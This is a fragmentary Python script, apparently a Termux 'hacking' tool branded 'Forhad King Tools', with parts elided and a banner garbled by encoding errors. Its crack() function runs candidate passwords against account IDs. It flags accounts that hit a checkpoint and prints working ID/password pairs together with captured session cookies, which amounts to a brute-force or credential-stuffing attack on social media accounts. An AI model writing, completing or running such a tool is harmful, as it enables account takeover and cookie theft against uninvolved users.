...
os.system('espeak -a 300 " Welcome,   to,  Forhad,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/DBX280')
def banner():
	os.system("clear")
	print (f"""
\33[1;92mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
\33[1;92mâ•‘ DEVELOPER    \33[1;91m â‚     \x1b[38;5;48m TERMUX KING\33[1;92m                â•‘
\33[1;92mâ•‘ FACEBOOK \33[1;91m     â‚     \x1b[38;5;208m FORHAD\33[1;92m             â•‘
\33[1;92mâ•‘ GITHUB     \33[1;91m   â‚    \x1b[38;5;47m Forhad0131\33[1;92m              â•‘
\33[1;92mâ•‘ TEAM    \33[1;91m      â‚  \x1b[38;5;47m   DARKWEB\33[1;92m             â•‘
\33[1;92mâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
\33[1;92mâ•‘ VERSION   \33[1;91m    â‚     \x1b[38;5;48m0.1\33[1;92m                    â•‘
\33[1;92mâ•‘ TOOLS    \33[1;91m     â‚    \x1b[38;5;208m FILE-/RANDOM\33[1;92m           â•‘
\33[1;92mâ•‘ WORK     \33[1;91m     â‚    \x1b[38;5;47m WIFI & DATA\33[1;92m            â•‘
\33[1;92mâ•‘ STATUS  \33[1;91m      â‚    \x1b[38;5;208m PAID-/FREE\33[1;92m             â•‘
\33[1;92mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
\33[1;92mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
\33[1;92mâ•‘ FB GROUP : DARK-WEB\33[1;92m  â•‘
\33[1;92mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;31m""")
def login():
	banner()
	...
	if TUTUL in ['m']:
		...
		os.system('xdg-open https://wa.me/+880143956')
	elif TUTUL in ['0']:
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN SPACEx\n\x1b[1;97m [1] METHOD HACK ')
	os.system('espeak -a 300 " 1,  method,  Hack"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[GHOST-X] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Tutul-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢Tutul-Cp] {idf} â€¢ {pw}')     
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}â€¢Tutul-OkðŸ’š] {idf} â€¢ {pw}\n\033[0;93m[ðŸŒº]= COOKIES â€¢ \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
